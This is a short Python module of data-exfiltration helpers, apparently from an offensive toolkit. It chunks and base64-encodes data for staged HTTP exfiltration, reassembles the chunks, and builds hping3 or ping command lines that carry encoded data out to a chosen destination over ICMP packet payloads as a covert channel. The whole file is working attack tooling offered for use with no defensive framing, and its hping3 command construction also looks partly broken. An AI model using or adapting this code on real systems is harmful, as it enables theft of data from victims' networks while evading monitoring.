"""HTTP-based exfiltration helpers: base64 chunking and ICMP fallback."""

from __future__ import annotations

import base64
import math
from collections.abc import Iterator

__all__ = [
    "http_chunks",
    "chunk_b64",
    "reassemble_b64",
    "icmp_exfil_command",
]

def http_chunks(data: bytes, chunk_size: int = 4096) -> Iterator[tuple[int, bytes]]:
    """Yield ``(index, chunk)`` pairs for chunked HTTP exfiltration.

    The receiver can reassemble ordered chunks using the index.
    """
    total = math.ceil(len(data) / chunk_size)
    for i in range(total):
        yield i, data[i * chunk_size : (i + 1) * chunk_size]

def chunk_b64(data: bytes, chunk_size: int = 2048) -> list[str]:
    """Split *data* into base64-encoded chunks for staged exfiltration."""
    return [
        base64.b64encode(data[i : i + chunk_size]).decode()
        for i in range(0, len(data), chunk_size)
    ]

def reassemble_b64(chunks: list[str]) -> bytes:
    """Reassemble base64-encoded chunks produced by :func:`chunk_b64`."""
    return b"".join(base64.b64decode(c) for c in chunks)

def icmp_exfil_command(data: str, destination: str, *, tool: str = "hping3") -> str:
    """Build a command for ICMP payload-based data exfiltration.

    *data* is base64-encoded and embedded in the ICMP packet payload.

    Args:
        tool: ``hping3`` (preferred) or ``ping`` (fallback, limited payload).
    """
    encoded = base64.b64encode(data.encode()).decode()
    if tool == "hping3":
        return (
            f"echo '{encoded}' | "
            f"hping3 --icmp -d {len(encoded)} --sign 'OFX' -c 1 {destination}"
        )
    hex_prefix = encoded[:16].encode().hex()
    return f"ping -c 1 -p {hex_prefix} {destination}"
